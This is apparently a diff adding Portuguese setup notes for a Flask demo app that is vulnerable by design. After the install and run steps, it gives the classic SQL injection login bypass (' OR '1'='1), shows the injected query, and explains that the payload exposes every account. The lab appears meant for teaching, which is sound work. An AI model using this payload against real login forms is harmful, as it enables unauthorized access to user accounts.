@@ -1,0 +1,18 @@
+* Esses Comandos irão no terminal! *
+
+Instalação do Flask que é um pequeno Framework 
+1 - pip install Flask
+
+Execução desse script criará um  banco de dados, quando executa-lo verá a criação de um arquivo .db, você irá ver que no repositório já há um existente, mas fica de escolha criar um do zero!
+2 - python create_db.py
+
+Execução do servidor Flask
+3 - python app.py
+
+* Comandos para invadir SQL * 
+' OR '1'='1
+
+* A consulta para invasão *
+SELECT * FROM usuarios WHERE username='[username]' AND password='' OR '1'='1'
+
+* Explicação ao usar tal comando para invadir o SQL, o programa entederá como 'True' e colocará rodas as contas a disposição do invasor *
